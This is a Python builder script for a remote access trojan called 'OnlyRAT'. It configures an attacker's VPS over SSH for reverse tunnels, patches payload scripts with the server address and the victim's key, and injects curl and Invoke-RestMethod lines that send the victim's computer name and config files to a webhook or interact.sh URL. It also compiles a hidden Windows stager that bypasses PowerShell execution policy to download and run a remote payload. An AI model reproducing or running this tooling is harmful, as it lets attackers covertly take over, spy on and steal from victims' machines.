import os
import sys
import subprocess
import time
import getpass

try:
    import paramiko
except ImportError:
    print("[!] Error: 'paramiko' is required for VPS automation.")
    print("    Install it with: sudo apt install python3-paramiko")
    sys.exit(1)

def log(message, level="INFO"):
    colors = {
        "INFO": "\033[94m[*]\033[0m",
        "SUCCESS": "\033[92m[+]\033[0m",
        "WARNING": "\033[93m[!]\033[0m",
        "ERROR": "\033[91m[!!]\033[0m",
        "LIVE": "\033[96m[LIVE]\033[0m"
    }
    timestamp = time.strftime("%H:%M:%S")
    print(f"{colors.get(level, '[*]')} {timestamp} - {message}")

def get_input(prompt, default=""):
    try:
        val = input(f"\033[95m[?]\033[0m {prompt} [{default}]: ").strip()
        return val if val else default
    except EOFError:
        return default

def patch_file(filepath, replacements):
    if not os.path.exists(filepath):
        log(f"File {filepath} not found.", "WARNING")
        return

    with open(filepath, 'r') as f:
        content = f.read()

    for old, new in replacements.items():
        content = content.replace(old, new)

    with open(filepath, 'w') as f:
        f.write(content)
    log(f"Patched {filepath}", "SUCCESS")

def run_vps_commands(client, commands):
    for cmd in commands:
        log(f"Executing: {cmd}", "LIVE")
        stdin, stdout, stderr = client.exec_command(cmd)
        exit_status = stdout.channel.recv_exit_status()
        if exit_status != 0:
            err = stderr.read().decode().strip()
            log(f"Command failed: {cmd}\nError: {err}", "ERROR")
        else:
            log(f"Success: {cmd}", "SUCCESS")

def check_port_vps(ssh, port):
    log(f"Checking if port {port} is available on VPS...")
    stdin, stdout, stderr = ssh.exec_command(f"netstat -tuln | grep :{port}")
    if stdout.read():
        log(f"Port {port} is ALREADY IN USE on the VPS!", "WARNING")
        return False
    log(f"Port {port} is free.", "SUCCESS")
    return True

def main():
    print("\033[1m\033[94m")
    print("====================================")
    print("   OnlyRAT Advanced Builder v2.1    ")
    print("====================================")
    print("\033[0m")
    log("Initializing advanced configuration and VPS automation engine...")

    base_dir = "."
    mode = get_input("Connection Mode (local/vps)", "vps").lower()
    exfil_method = get_input("Exfiltration Method (webhook/interactsh)", "webhook").lower()
    exfil_url = get_input("Enter Webhook URL or interact.sh link", "https://interact.sh/...")

    if mode == "vps":
        vps_ip = get_input("VPS IP Address", "1.2.3.4")
        vps_user = get_input("VPS Username", "root")
        vps_port = int(get_input("VPS SSH Port", "22"))
        vps_password = getpass.getpass("\033[95m[?]\033[0m Enter VPS Password: ")
        vps_forward_port = get_input("VPS Forwarded Port (for RAT connection)", "2583")

        vps_web_port = get_input("VPS Web Server Port", "8080")
        vps_web_dir = get_input("VPS Web Directory", f"/home/{vps_user}/onlyrat_web")

        # 1. Connect to VPS
        log(f"Connecting to VPS at {vps_ip}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(vps_ip, port=vps_port, username=vps_user, password=vps_password)
            log("Connected to VPS.", "SUCCESS")
        except Exception as e:
            log(f"Connection failed: {e}", "ERROR")
            sys.exit(1)

        # 2. Check ports
        if not check_port_vps(ssh, vps_forward_port):
            if get_input("RAT Port in use. Continue? (y/n)", "n").lower() != 'y': sys.exit(1)
        if not check_port_vps(ssh, vps_web_port):
            if get_input("Web Port in use. Continue? (y/n)", "n").lower() != 'y': sys.exit(1)

        # 3. Configure VPS (SSH & Firewall)
        log("Configuring VPS (SSH, GatewayPorts, UFW Firewall)...")
        vps_setup_commands = [
            "sed -i 's/^#AllowTcpForwarding.*/AllowTcpForwarding yes/' /etc/ssh/sshd_config",
            "sed -i 's/^AllowTcpForwarding.*/AllowTcpForwarding yes/' /etc/ssh/sshd_config",
            "sed -i 's/^#GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config",
            "sed -i 's/^GatewayPorts.*/GatewayPorts yes/' /etc/ssh/sshd_config",
            "service ssh restart || systemctl restart ssh",
            f"ufw allow {vps_forward_port}/tcp",
            f"ufw allow {vps_web_port}/tcp",
            "ufw --force enable"
        ]
        run_vps_commands(ssh, vps_setup_commands)

        # 4. Patch Files
        log("Patching local payloads...")
        patch_file(f"{base_dir}/installers/from-vps.cmd", {
            'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}:{vps_web_port}"',
            'http://%EcSjRhAguo%/mk01-onlyrat/payloads/v1.cmd': 'http://%EcSjRhAguo%/payloads/v1.cmd'
        })
        patch_file(f"{base_dir}/payloads/v1.cmd", {
            'set "EcSjRhAguo=X.X.X.X"': f'set "EcSjRhAguo={vps_ip}:{vps_web_port}"',
            'http://%EcSjRhAguo%/mk01-onlyrat/payloads/v2.ps1': 'http://%EcSjRhAguo%/payloads/v2.ps1'
        })

        replacements = {
            '$nkowFESgaO = "USERNAME"': f'$nkowFESgaO = "{vps_user}"',
            '$ecPlmJVLRo = "X.X.X.X"': f'$ecPlmJVLRo = "{vps_ip}"',
            '$ENyMAhIrsb = "22"': f'$ENyMAhIrsb = "{vps_port}"',
            '$YlEQgBmePn = "2583"': f'$YlEQgBmePn = "{vps_forward_port}"',
            'Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key"': f'Invoke-WebRequest -Uri "http://$ecPlmJVLRo:{vps_web_port}/key"'
        }

        if exfil_method == "interactsh":
            replacements['Start-Service sshd'] = f'Start-Service sshd; Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "SSH Service Started on $env:COMPUTERNAME"'
            replacements['ssh-keyscan.exe'] = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "SSH KeyScanned on $env:COMPUTERNAME"; ssh-keyscan.exe'
            replacements['Remove-Item $CRYnrkaDbe'] = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "Config exfiltrating from $env:COMPUTERNAME"; Invoke-RestMethod -Uri "{exfil_url}" -Method Post -InFile $CRYnrkaDbe; Remove-Item $CRYnrkaDbe'
            replacements['start "./$GlNweBEFmh.cmd"'] = f'Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "Reverse Tunnel starting on $env:COMPUTERNAME"; start "./$GlNweBEFmh.cmd"'
        else:
            replacements['Start-Service sshd'] = f'Start-Service sshd; curl.exe -F "content=SSH Service Started on $env:COMPUTERNAME" {exfil_url}'
            replacements['ssh-keyscan.exe'] = f'curl.exe -F "content=SSH KeyScanned on $env:COMPUTERNAME" {exfil_url}; ssh-keyscan.exe'
            replacements['Remove-Item $CRYnrkaDbe'] = f'curl.exe -F "content=Config exfiltrating from $env:COMPUTERNAME" {exfil_url}; curl.exe -F "file=@$CRYnrkaDbe" {exfil_url}; Remove-Item $CRYnrkaDbe'
            replacements['start "./$GlNweBEFmh.cmd"'] = f'curl.exe -F "content=Reverse Tunnel starting on $env:COMPUTERNAME" {exfil_url}; start "./$GlNweBEFmh.cmd"'

        patch_file(f"{base_dir}/payloads/v2.ps1", replacements)

        # 5. Deploy & Start Webserver on VPS
        log(f"Deploying payloads to {vps_web_dir} and starting Python webserver on port {vps_web_port}...")
        ssh.exec_command(f"mkdir -p {vps_web_dir}/payloads")
        sftp = ssh.open_sftp()
        for filename in os.listdir(f"{base_dir}/payloads"):
            local_path = os.path.join(f"{base_dir}/payloads", filename)
            if os.path.isfile(local_path):
                sftp.put(local_path, f"{vps_web_dir}/payloads/{filename}")
        sftp.put(f"{base_dir}/key.pub", f"{vps_web_dir}/key.pub")
        sftp.put(f"{base_dir}/key", f"{vps_web_dir}/key")
        sftp.close()

        # Start python webserver in background
        log(f"Starting Python HTTP server on port {vps_web_port}...", "LIVE")
        ssh.exec_command(f"cd {vps_web_dir} && (nohup python3 -m http.server {vps_web_port} > web.log 2>&1 &)")
        log("Webserver started.", "SUCCESS")
        ssh.close()

    else:
        # Local mode ...
        log("Configuring for Local mode...")
        patch_file(f"{base_dir}/installers/from-github.cmd", { "DISCORDWEBHOOK": exfil_url })
        g2_replacements = {}
        if exfil_method == "interactsh":
             g2_replacements['curl.exe -F "payload_json={\\\"username\\\": \\\"onlyrat\\\", \\\"content\\\": \\\"download me\\\"}" -F "file=@$env:username.rat" $PEBgxuJUfd'] = f'curl.exe -X POST -T "$env:username.rat" {exfil_url}'
             g2_replacements['Start-Service sshd'] = f'Start-Service sshd; Invoke-RestMethod -Uri "{exfil_url}" -Method Post -Body "Local Target online: $env:COMPUTERNAME"'
        else:
             g2_replacements['Start-Service sshd'] = f'Start-Service sshd; curl.exe -F "content=Local Target online: $env:COMPUTERNAME" {exfil_url}'
        patch_file(f"{base_dir}/payloads/g2.ps1", g2_replacements)

    # 6. Compilation
    compile_exe = get_input("Compile EXE stager? (y/n)", "y").lower()
    if compile_exe == "y":
        target_url = f"http://{vps_ip}:{vps_web_port}/payloads/v1.cmd" if mode == "vps" else "https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/payloads/g1.cmd"
        stager_url = get_input("Confirm Stager Download URL", target_url)
        c_code = f"""
#include <windows.h>
#include <stdio.h>
int main() {{
    HWND hWnd = GetConsoleWindow(); ShowWindow(hWnd, SW_HIDE);
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"$url='{stager_url}'; $file='%TEMP%\\\\stager.cmd'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process $file -WindowStyle Hidden\\\"");
    system(cmd); return 0;
}}
"""
        with open("stager.c", "w") as f: f.write(c_code)
        log("Compiling stager.exe...", "LIVE")
        subprocess.run(["x86_64-w64-mingw32-gcc", "stager.c", "-o", "stager.exe", "-mwindows"], check=True)
        log("stager.exe created!", "SUCCESS")

    print("\n\033[1m\033[92m[***] BUILD COMPLETE [***]\033[0m")
    log(f"Deployed to VPS at http://{vps_ip}:{vps_web_port}/")

if __name__ == "__main__":
    main()
